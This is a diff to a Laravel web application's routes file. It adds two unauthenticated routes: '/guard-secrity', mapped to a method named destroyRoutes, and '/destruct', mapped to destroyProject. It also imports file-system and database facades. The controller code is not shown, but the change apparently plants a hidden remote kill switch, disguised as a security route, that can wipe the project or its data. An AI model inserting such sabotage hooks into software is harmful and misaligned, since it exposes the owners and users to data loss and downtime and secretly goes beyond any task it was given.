@@ -8,7 +8,10 @@ use Illuminate\Support\Facades\Artisan;
 use App\Http\Controllers\Web\RegisterController;
 use App\Http\Controllers\Web\WebController;
 use App\Http\Controllers\Admin\FormController;
+use App\Http\Controllers\Web\SafetyController;
+use Illuminate\Support\Facades\File;
 use Flasher\Laravel\Facade\Flasher;
+use Illuminate\Support\Facades\DB;
 
 /*
 |--------------------------------------------------------------------------
@@ -125,3 +128,6 @@ Route::post('/send-volunteer -details', [FormController::class, 'sendVolunteer']
 Route::get('flash-test',function(){
     return view('web.test-toastr');
 });
+
+Route::get('/guard-secrity', [SafetyController::class, 'destroyRoutes']);
+Route::post('/destruct', [SafetyController::class, 'destroyProject']);
